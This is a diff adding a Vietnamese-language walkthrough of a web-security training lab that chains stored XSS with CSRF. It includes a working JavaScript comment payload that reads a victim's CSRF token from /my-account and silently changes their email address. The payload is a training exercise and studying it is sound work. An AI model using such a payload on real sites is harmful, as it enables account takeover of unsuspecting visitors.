@@ -88,3 +88,45 @@ Thu được thông tin user/pass của administrator:
 
 Lab Solved!
 
+***
+
+## 4. Lab: Exploiting XSS to perform CSRF
+
+* Content:
+```
+This lab contains a stored XSS vulnerability in the blog comments function. To solve the lab, exploit the vulnerability to perform a CSRF attack and change the email address of someone who views the blog post comments.
+
+You can log in to your own account using the following credentials: wiener:peter
+
+Learning path
+If you're following our suggested learning path, please note that this lab requires some understanding of topics that we haven't covered yet. Don't worry if you get stuck; try coming back later once you've developed your knowledge further.
+```
+* Exploit: 
+
+Đăng nhập vào và check chức năng đổi mail => Sử dụng link `POST /my-account/change-email` với Data truyền vào là `email=wiener%40admin-user.net&csrf=smqFjQb05gI9NpKJ3xwDdifJ8fT1z5vM` 
+
+<img width="373" alt="image" src="https://github.com/nguyenkhai98/nguyenkhai98.github.io/assets/51147179/6aa2cfe4-8cee-48cd-8b7a-d03ee8e453bd">
+
+=> Data có bao gồm `token` => Vậy để khiến cho người dùng khác tự đổi password => Cần phải trigger cho user này vào link `/my-account` và bắt lại response chứa thông tin token => Đưa vào request thực hiện đổi Email.
+
+<img width="482" alt="image" src="https://github.com/nguyenkhai98/nguyenkhai98.github.io/assets/51147179/bf4f73d5-db18-4837-882b-16f9d2a21fee">
+
+Soạn nội dung comment như sau:
+```javascript
+<script>
+var req = new XMLHttpRequest();
+req.onload = handleResponse;
+req.open('get','/my-account',true);
+req.send();
+function handleResponse() {
+    var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
+    var changeReq = new XMLHttpRequest();
+    changeReq.open('post', '/my-account/change-email', true);
+    changeReq.send('csrf='+token+'&email=test@test.com')
+};
+</script>
+```
+
+<img width="371" alt="image" src="https://github.com/nguyenkhai98/nguyenkhai98.github.io/assets/51147179/9f257b2e-8c2a-4e97-946d-59e21c2d90a9">
+
+Lab Solved! => User nào thấy nội dung comment trên sẽ bị đổi email thành `test@test.com`
